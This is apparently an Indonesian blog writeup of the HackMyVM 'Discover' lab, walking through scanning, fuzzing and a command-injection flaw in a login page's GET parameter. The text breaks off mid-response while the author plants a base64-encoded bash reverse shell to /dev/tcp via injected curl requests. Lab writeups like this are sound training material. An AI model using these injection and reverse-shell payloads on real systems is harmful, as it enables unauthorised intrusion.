---
layout: post
title: "HackMyVM: Discover"
date: 2022-09-09
categories: hackmyvm
tags: [command-injection, basic-overflow, glassfish, msfvenom]
---

Yap, sudah lama sekali saya tidak menulis blog. Post kali ini saya membagikan writeup yang saya selesaikan untuk machine *Discover* yang disediakan oleh [HackMyVM](https://hackmyvm.eu).
Dari mulai scanning nmap, fuzzing subdomain, lalu mencoba testing pada web application dan menemukan celah *command injection* sampai pada tahap privilege escalation yang membosankan karena
saya perlu untuk membaca dokumentasi glasshfish (sebuah service *Java* untuk web application).

## Recon
### nmap scanning
```xml
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Initiating Ping Scan at 11:35
Scanning 192.168.56.8 [2 ports]
Completed Ping Scan at 11:35, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:35
Completed Parallel DNS resolution of 1 host. at 11:35, 6.52s elapsed
DNS resolution of 1 IPs took 6.61s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 1, SF: 2, TR: 4, CN: 0]
Initiating Connect Scan at 11:35
Scanning 192.168.56.8 [7 ports]
Discovered open port 8080/tcp on 192.168.56.8
Discovered open port 80/tcp on 192.168.56.8
Discovered open port 8181/tcp on 192.168.56.8
Discovered open port 4848/tcp on 192.168.56.8
Discovered open port 3700/tcp on 192.168.56.8
Discovered open port 7676/tcp on 192.168.56.8
Discovered open port 8686/tcp on 192.168.56.8
Completed Connect Scan at 11:35, 0.00s elapsed (7 total ports)
Initiating Service scan at 11:35
Scanning 7 services on 192.168.56.8
Completed Service scan at 11:37, 134.64s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.56.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
NSE Timing: About 99.48% done; ETC: 11:38 (0:00:00 remaining)
Completed NSE at 11:38, 31.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 3.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Nmap scan report for 192.168.56.8
Host is up, received syn-ack (0.00053s latency).
Scanned at 2022-09-09 11:35:28 WIB for 170s
warning: ruby-getoptlong will be installed before its ruby dependency
PORT     STATE SERVICE              REASON  VERSION
80/tcp   open  http                 syn-ack Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to http://discover.hmv/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3700/tcp open  giop                 syn-ack CORBA naming service
|_giop-info: ERROR: Script execution failed (use -d to debug)
4848/tcp open  appserv-http?        syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 202 Accepted
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Content-Type: text/html;charset=UTF-8
|     Connection: close
|     Content-Length: 6008
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
|     <head>
|     <!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are satisfied: GNU General Public Lic
|   HTTPOptions: 
|     HTTP/1.1 405 OPTIONS method is not allowed
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET, POST, HEAD, DELETE, PUT
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:31 GMT
|     Connection: close
|_    Content-Length: 0
7676/tcp open  java-message-service syn-ack Java Message Service 301
8080/tcp open  http-proxy           syn-ack Eclipse GlassFish  6.1.0 
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:25 GMT
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 3668
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html lang="en">
|     <!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     Copyright (c) 2020 Contributors to the Eclipse Foundation.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are satisfied: GNU General Public License,
|     version 2 with the
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:25 GMT
|     Connection: close
|_    Content-Length: 0
|_http-server-header: Eclipse GlassFish  6.1.0 
|_http-title: Eclipse GlassFish - Server Running
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
8181/tcp open  intermapper?         syn-ack
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Issuer: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-22T16:19:00
| Not valid after:  2031-05-20T16:19:00
| MD5:   0b58 ea49 e0e1 0013 67a0 0ede d007 fb84
| SHA-1: 5dea 602a 3d43 65fd a141 3bb5 bea0 2320 f87a cb96
| -----BEGIN CERTIFICATE-----
| MIIDmTCCAoGgAwIBAgIEFr+FQDANBgkqhkiG9w0BAQsFADB9MQswCQYDVQQGEwJD
| QTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0YXdhMSMwIQYDVQQKExpF
| Y2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UECxMJR2xhc3NGaXNoMRIw
| EAYDVQQDEwlsb2NhbGhvc3QwHhcNMjEwNTIyMTYxOTAwWhcNMzEwNTIwMTYxOTAw
| WjB9MQswCQYDVQQGEwJDQTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0
| YXdhMSMwIQYDVQQKExpFY2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UE
| CxMJR2xhc3NGaXNoMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDI1/xR4GcIAsIfJ+BCb7q/NZvwLkhDthYkR20kCpia
| LXyHfu697WTGCMe9jywBEYpa5JMge4ubOqLWwhZq9xAcVo1kv/t9iYByrgbOzvLT
| FvxlfWv5beeRQADo9r+PwtPNbWD+VzPTASEWNs7GDOV1nTzyXVDUgzNBwJWk9waI
| qCOyvfWb9Bl9moQLD0amNp6iCKIsEU+bpvREZFBoN6CiYcQdmkO5ie8hwbxPhQOk
| zBDhL5/XtPXES+Y99XjXPheiJn/lv9r1wEoJqwhYOgrDZC9jzPP1c879kG9cKso8
| 9YKUdKZsIQ4Vn/y8qFm/19o/fvl+WiG1lOmqL++1yenDAgMBAAGjITAfMB0GA1Ud
| DgQWBBRwGYN8tv57bJNlgoWzTFGbnh0USjANBgkqhkiG9w0BAQsFAAOCAQEAswUf
| 0tmSulCmt9JobZuI7Mp2ttmicRHcmLW7VEBD92GvQbopEAzd3G4+Y+J7mgNXQn4l
| wOEMduGoztZUrtRt/0SmHr99mmGO3qNpyGRF/il8iPBOwrBeYREgzPds2T04NCe/
| 6n100EmCyXw0SXBMzQW4CFN6k+w/+mGL9bsG4d8+1wfZGssCKzSwFYUUN9BqDc3I
| EKEp2/NyvaZYH5FTP/HnmkdEanCeIuGNxGK9hoYHC2H38cbUGdJxDZJybNCFZ6le
| w5iCZRknr73qCQHiMLn3AMT+C2tkmK1EnKC/L4phikiCHN+w5Gn/s0PXqmHtkTqQ
| 0BLjvy992do5GE6ISQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
8686/tcp open  java-rmi             syn-ack Java RMI
| rmi-dumpregistry: 
|   debian/7676/jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:34231
|     extends
|       java.rmi.server.RemoteStub
|       extends
|         java.rmi.server.RemoteObject
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4848-TCP:V=7.92%I=7%D=9/9%Time=631AC29C%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1851,"HTTP/1\.1\x20202\x20Accepted\r\nServer:\x20Eclipse\x20Gla
SF:ssFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\
SF:(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nContent
SF:-Type:\x20text/html;charset=UTF-8\r\nConnection:\x20close\r\nContent-Le
SF:ngth:\x206008\r\n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtm
SF:l1-strict\.dtd\">\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\"\x2
SF:0xml:lang=\"en\"\x20lang=\"en\">\n<head>\n<!--\n\n\x20\x20\x20\x20Copyr
SF:ight\x20\(c\)\x202010,\x202018\x20Oracle\x20and/or\x20its\x20affiliates
SF:\.\x20All\x20rights\x20reserved\.\n\n\x20\x20\x20\x20This\x20program\x2
SF:0and\x20the\x20accompanying\x20materials\x20are\x20made\x20available\x2
SF:0under\x20the\n\x20\x20\x20\x20terms\x20of\x20the\x20Eclipse\x20Public\
SF:x20License\x20v\.\x202\.0,\x20which\x20is\x20available\x20at\n\x20\x20\
SF:x20\x20http://www\.eclipse\.org/legal/epl-2\.0\.\n\n\x20\x20\x20\x20Thi
SF:s\x20Source\x20Code\x20may\x20also\x20be\x20made\x20available\x20under\
SF:x20the\x20following\x20Secondary\n\x20\x20\x20\x20Licenses\x20when\x20t
SF:he\x20conditions\x20for\x20such\x20availability\x20set\x20forth\x20in\x
SF:20the\n\x20\x20\x20\x20Eclipse\x20Public\x20License\x20v\.\x202\.0\x20a
SF:re\x20satisfied:\x20GNU\x20General\x20Public\x20Lic")%r(HTTPOptions,E9,
SF:"HTTP/1\.1\x20405\x20OPTIONS\x20method\x20is\x20not\x20allowed\r\nServe
SF:r:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servl
SF:et/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/De
SF:bian/11\)\r\nAllow:\x20GET,\x20POST,\x20HEAD,\x20DELETE,\x20PUT\r\nConn
SF:ection:\x20close\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,E6,"HT
SF:TP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nServer:\x20Ecl
SF:ipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x
SF:20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)
SF:\r\nDate:\x20Fri,\x2009\x20Sep\x202022\x2004:35:31\x20GMT\r\nConnection
SF::\x20close\r\nContent-Length:\x200\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.92%I=7%D=9/9%Time=631AC296%P=x86_64-pc-linux-gnu%r(Get
SF:Request,F3E,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Eclipse\x20GlassFish\
SF:x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Eclips
SF:e\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nDate:\x20Fri,\
SF:x2009\x20Sep\x202022\x2004:35:25\x20GMT\r\nContent-Type:\x20text/html\r
SF:\nConnection:\x20close\r\nContent-Length:\x203668\r\n\r\n<!DOCTYPE\x20H
SF:TML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\">\
SF:n<html\x20lang=\"en\">\n<!--\n\n\tCopyright\x20\(c\)\x202010,\x202018\x
SF:20Oracle\x20and/or\x20its\x20affiliates\.\x20All\x20rights\x20reserved\
SF:.\n\tCopyright\x20\(c\)\x202020\x20Contributors\x20to\x20the\x20Eclipse
SF:\x20Foundation\.\n\t\n\x20\x20\x20\x20This\x20program\x20and\x20the\x20
SF:accompanying\x20materials\x20are\x20made\x20available\x20under\x20the\n
SF:\x20\x20\x20\x20terms\x20of\x20the\x20Eclipse\x20Public\x20License\x20v
SF:\.\x202\.0,\x20which\x20is\x20available\x20at\n\x20\x20\x20\x20http://w
SF:ww\.eclipse\.org/legal/epl-2\.0\.\n\n\x20\x20\x20\x20This\x20Source\x20
SF:Code\x20may\x20also\x20be\x20made\x20available\x20under\x20the\x20follo
SF:wing\x20Secondary\n\x20\x20\x20\x20Licenses\x20when\x20the\x20condition
SF:s\x20for\x20such\x20availability\x20set\x20forth\x20in\x20the\n\x20\x20
SF:\x20\x20Eclipse\x20Public\x20License\x20v\.\x202\.0\x20are\x20satisfied
SF::\x20GNU\x20General\x20Public\x20License,\n\x20\x20\x20\x20version\x202
SF:\x20with\x20the\x20")%r(HTTPOptions,C5,"HTTP/1\.1\x20405\x20Method\x20N
SF:ot\x20Allowed\r\nServer:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\n
SF:X-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x20
SF:6\.1\.0\x20\x20Java/Debian/11\)\r\nAllow:\x20GET\r\nConnection:\x20clos
SF:e\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,E6,"HTTP/1\.1\x20505\
SF:x20HTTP\x20Version\x20Not\x20Supported\r\nServer:\x20Eclipse\x20GlassFi
SF:sh\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Ecl
SF:ipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nDate:\x20Fr
SF:i,\x2009\x20Sep\x202022\x2004:35:25\x20GMT\r\nConnection:\x20close\r\nC
SF:ontent-Length:\x200\r\n\r\n");
Service Info: Host: discover.hmv

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.55 seconds

```
banyak sekali open port yang sudah diperoleh oleh nmap.
* 80 - HTTP, Apache httpd 2.4.54
* 3700 - TCP, COBRA naming service (saya tidak terlalu tau pasti ini apa)
* 4848 - appserv-http?, semacam service untuk mengadministrasi web (maybe?)
* 7676 - java-message-service
* 8080 - Eclipse Glassfish 6.1.0

karena pada output nmap di atas menunjukkan *url redirect*, dan biasanya saya sebelum pertikaian dimulai saya sudah mencoba testing pada *IP Host* apakah ada redireksi ke *custom domain* atau tidak. ternyata hasilnya
```bash
╭─ via [machines/discover]
╰─ curl -I 192.168.56.8
HTTP/1.1 302 Found
Date: Fri, 09 Sep 2022 12:23:25 GMT
Server: Apache/2.4.54 (Debian)
Location: http://discover.hmv/
Content-Type: text/html; charset=iso-8859-1

```
karena file *hosts* yang saya punya sudah saya buat *writable* maka saya sudah menyederhanakan diri saya sendiri untuk menambahkan apapun jenis *custom domain* kalau nanti-nanti saya memainkan permainan CTF atau membuat suatu *custom redirection* pada *public DNS*.
```bash
╭─ via [machines/discover]
╰─ echo "192.168.56.8" >> /etc/hosts
```

### 3700 - TCP, Cobra naming service

![image](https://i.ibb.co/mRxcg9C/image.png)

![image2](https://i.ibb.co/2smmCt5/image.png)

hmm, tidak ada hal yang menarik untuk ditelaah jadi saya mencoba memeriksa port yang lain lagi.

### 4848 - appserv-http?
```sh
╭─ via [machines/discover]
╰─ curl -sI discover.hmv:4848
HTTP/1.1 302 Found
Location: https://discover.hmv:4848/
Content-Length: 0
Date: Fri, 09 Sep 2022 12:27:51 GMT

```
HTTP status menunjukkan 302, itu berarti masih bisa diakses tapi karena sifatnya *Moved Temporarily* berarti ini sudah menampakkan kesan bahwa ada kemungkinan munculnya redireksi, jadi saya cek apakah ada tampilah webnya atau tidak.

![loginpage](https://i.ibb.co/XFZgPnB/image.png)

disini malah menampilkan, login page. sudah saya coba googling untuk mendapatkan *default credentials* tetap saja sama tidak ada yang bisa. karena ini based on *Java* tidak ada kemungkinan yang bisa dicapai dengan SQLi ataupun metode lain.

### 7676 - Java Message Service 301

sama seperti yang pertama, tidak ada tampilan yang ditunjukkan.

### 8080 - Eclipse Glassfish 6.1.0

```bash
╭─ via [machines/discover]
╰─ curl -I http://discover.hmv:8080                                                                                          1 ↵
HTTP/1.1 200 OK
Server: Eclipse GlassFish  6.1.0 
X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish  6.1.0  Java/Debian/11)
Accept-Ranges: bytes
ETag: W/"3668-1662713904312"
Last-Modified: Fri, 09 Sep 2022 08:58:24 GMT
Content-Length: 3668
Content-Type: text/html
```
![server-running](https://i.ibb.co/VBkHWwb/image.png)

pada gambar diatas, server sudah berjalan dengan baik dan letak administrasi ditujukan pada port 4848. jadi, saya berniat untuk mengeceknya nanti.

### 80 - HTTP Apache

ini adalah tampilan website secara keseluruhan.

![gambar](https://i.ibb.co/x61Zk9h/screencapture-discover-hmv-2022-09-09-19-43-23.png)

terlihat seperti website biasa dan mungkin terlihat sedikit template haha, dan di atas ada tombol login pada bagian navbar, mungkin saya bisa memasukkan metode-metode injeksi pada laman ini nantinya. 

Tapi saya mencoba untuk mem-bruteforce website secara keseluruhan agar saya tau struktur websitenya.

## bruteforcing directory

```sh
╭─ via [machines/discover]
╰─ cat scan_gobuster               
/contact.php          (Status: 200) [Size: 1363]
/aboutus.jpg          (Status: 200) [Size: 507077]
/aboutus.php          (Status: 200) [Size: 17734]
/home.php             (Status: 200) [Size: 29575]
/assets               (Status: 301) [Size: 313] [--> http://discover.hmv/assets/]
/img                  (Status: 301) [Size: 310] [--> http://discover.hmv/img/]
/admin.jpg            (Status: 200) [Size: 6965]
/css                  (Status: 301) [Size: 310] [--> http://discover.hmv/css/]
/courses.php          (Status: 200) [Size: 19066]
/review.php           (Status: 200) [Size: 1277]
/courses              (Status: 301) [Size: 314] [--> http://discover.hmv/courses/]
/manual               (Status: 301) [Size: 313] [--> http://discover.hmv/manual/]
/js                   (Status: 301) [Size: 309] [--> http://discover.hmv/js/]
/statistics.php       (Status: 500) [Size: 1339]
/logout.php           (Status: 302) [Size: 22] [--> home.php]
/myaccount.php        (Status: 200) [Size: 6302]
/payment.php          (Status: 200) [Size: 1351]
/fonts                (Status: 301) [Size: 312] [--> http://discover.hmv/fonts/]
/forgotpassword.php   (Status: 200) [Size: 1063]
/forgotpassword.html  (Status: 200) [Size: 8647]
/wall.jpg             (Status: 200) [Size: 1540495]
/wall.png             (Status: 200) [Size: 698653]
/contactform          (Status: 301) [Size: 318] [--> http://discover.hmv/contactform/]
/back1.jpg            (Status: 200) [Size: 144583]
/chat1.php            (Status: 200) [Size: 2604]
/server-status        (Status: 403) [Size: 277]
/chat2.php            (Status: 500) [Size: 2287]
/aboutus2.jpg         (Status: 200) [Size: 459074]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 277]

```
well, saya tidak melihat adanya *login page* pada output gobuster di atas jadi saya bergerak ke burp suite untuk meng-*intercept* cara bekerja web yang sedang saya hadapi.

## burp suite intercepting

![image](https://i.ibb.co/0DkLDJv/image.png)

well, file *php* yang sangat tidak wajar, pikir saya. tanpa banyak basa basi saya langsung googling siapa tau bisa mendapatkan source-source di internet atau semacamnya.

dan ternyata, saya menemukannya di [repository github](https://github.com/kirubashetty/edutor).<br/>
saat saya mencoba keliling sebentar pada repo tersebut dan saya berfikir bahwa tidak ada yang menarik.

## fuzzing a subdomain

```sh
╭─ via [machines/discover]
╰─ cat scan.wfuzz 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://discover.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                          
=====================================================================

000000541:   200        22 L     51 W       822 Ch      "log" 
```
terlihat juga pada hasil wfuzz ada satu subdomain yang tercantum, jadi seperti biasa saya nge-save output ini pada file *hosts*.
```sh
╭─ via [machines/discover]
╰─ echo "192.168.56.8 log.discover.hmv" >> /etc/hosts 
```

## bruteforcing subdomain directory
```sh
╭─ via [machines/discover]
╰─ cat scan_gobuster.2                                                                                                     130 ↵
/index.php            (Status: 200) [Size: 822]
/manual               (Status: 301) [Size: 321] [--> http://log.discover.hmv/manual/]
/server-status        (Status: 403) [Size: 281]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 281]

```
hanya ada satu file yang bisa saya percayai, yaitu *index.php*. selain itu saya tidak yakin apakah bisa membantu saya kedepannya :)

## shell as www-data

![file](https://i.ibb.co/1zTTR3b/screencapture-log-discover-hmv-index-php-2022-09-09-20-08-21.png)

beginilah tampilannya, saya melihat pada tombol *submit* seperti dibuat sengaja untuk *disable* lalu saat saya cek sourcenya

```sh
╭─ via [machines/discover]
╰─ curl -v log.discover.hmv        
*   Trying 192.168.56.8:80...
* Connected to log.discover.hmv (192.168.56.8) port 80 (#0)
> GET / HTTP/1.1
> Host: log.discover.hmv
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 09 Sep 2022 13:10:14 GMT
< Server: Apache/2.4.54 (Debian)
< Vary: Accept-Encoding
< Content-Length: 822
< Content-Type: text/html; charset=UTF-8
< 
<html>
  <head>
    <title>Discover login</title>
  </head>
  <body>
    <div style="background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px">
    </div>
    <div style="background-color:#c9c9c9;padding:20px;">
      <h1 align="center">Login as Discover</h1>
    <form align="center" action="index.php" method="$_GET">
      <label align="center">Username:</label><br>
      <input align="center" type="text" name="username" value="Discover"><br>
      <label>Password:</label><br>
      <input align="center" type="password" name="password" value=""><br>
    <input align="center" type="submit" disabled="disabled" value="Submit">

    </form>
  </div>
  <div style="background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px" align="center">
      </div>
  </body>
</html>
* Connection #0 to host log.discover.hmv left intact
```
pada *tag* form terdapat satu atribut method menggunakan *GET request* jadi sudah pasti bisa diprediksi bahwa tidak ada *POST request* yang bisa ditelusuri lagi karena query tidak bisa diredireksi dan diproses lebih lanjut pada status backend dari web ini. waw, lalu saya pun mencoba *LFI* dan *directory traversal* tapi tetap tidak bisa, sebelumnya *disable method*nya saya hapus agar saya bisa melihat seperti apa *GET request* bekerja.

```html
<input align="center" type="submit" value="Submit">
```
*output query* yang dihasilkan dari request.
```js
http://log.discover.hmv/index.php?username=Discover&password=aaaaaaaaaaa

```
tidak ada hasil yang pasti, error message atau semacamnya. memang tampak aneh dan sangat wajar dalam dunia CTF apalagi machine pada difficulty medium.
*SSTI* sudah saya coba tapi tetap tidak bisa, ya iyalah orang beda franework yang dipakai. lalu saat saya mencoba untuk ngetest command injection dengan command *uname -a* dengan *curl* hasilnya akan saya letakkan di bawah ini.
```html
╭─ via [machines/discover]
╰─ curl -s 'http://log.discover.hmv/index.php?username=uname+-a&password=aaaaaaaaaaa'
<html>
  <head>
    <title>Discover login</title>
  </head>
  <body>
    <div style="background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px">
    </div>
    <div style="background-color:#c9c9c9;padding:20px;">
      <h1 align="center">Login as Discover</h1>
    <form align="center" action="index.php" method="$_GET">
      <label align="center">Username:</label><br>
      <input align="center" type="text" name="username" value="Discover"><br>
      <label>Password:</label><br>
      <input align="center" type="password" name="password" value=""><br>
    <input align="center" type="submit" disabled="disabled" value="Submit">

    </form>
  </div>
  <div style="background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px" align="center">
    Linux debian 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64 GNU/Linux
  </div>
  </body>
</html>

```
langsung gercep untuk pasang *reverse shell* eh ternyata-ternyata~ gagal. payload yang saya masukkan
```sh
echo "7dOy1%2BT7Hq%2B%2BuiKqhWX4zCvVd8C7LBO%2B" | base64 -d | bash
```
itu adalah basic rev shell yang berbasis *bash* dan saya *encode* menggunakan *base64*. tetap tidak bisa. lalu saya coba untuk di*encode* ke *URL* tetap tidak bisa juga.
```sh
╭─ via [machines/discover]
╰─ python -c 'import urllib.parse; string = "echo \"7dOy1%2BT7Hq%2B%2BuiKqhWX4zCvVd8C7LBO%2B\" | base64 -d | bash "; print(urllib.parse.quote_plus(string))'
echo+%227dOy1%252BT7Hq%252B%252BuiKqhWX4zCvVd8C7LBO%252B%22+%7C+base64+-d+%7C+bash

```
lalu saya ganti dalam bentuk script yang dioutputkan ke */tmp* tetap sama saja ketika saya eksekusi tidak membuahkan hasil.

### /dev/shm - shared memory

karena semua directory dalam satu sistem tidak ada yang bisa entah karena apa, maka saya mencoba untuk menaruh file script ke dalam */dev/shm* directory agar bisa dieksekusi.

```sh
╭─ via [machines/discover]
╰─ python -c 'import urllib.parse; string = "echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==\" | base64 -d > /dev/shm/shell.sh"; print(urllib.parse.quote_plus(string))'
echo+%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg%3D%3D%22+%7C+base64+-d+%3E+%2Fdev%2Fshm%2Fshell.sh
╭─ via [machines/discover]
╰─ curl -s 'http://log.discover.hmv/index.php?username=echo+%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg%3D%3D%22+%7C+base64+-d+%3E+%2Fdev%2Fshm%2Fshell.sh&password=aaaaaaaaaaa'
<html>
  <head>
    <title>Discover login</title>
  </head>
  <body>
    <div style="background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px">
    </div>
    <div style="background-color:#c9c9c9;padding:20px;">
      <h1 align="center">Login as Discover</h1>
    <form align="center" action="index.php" method="$_GET">
      <label align="center">Username:</label><br>
      <input align="center" type="text" name="username" value="Discover"><br>
      <label>Password:</label><br>
      <input align="center" type="password" name="password" value=""><br>
    <input align="center" type="submit" disabled="disabled" value="Submit">

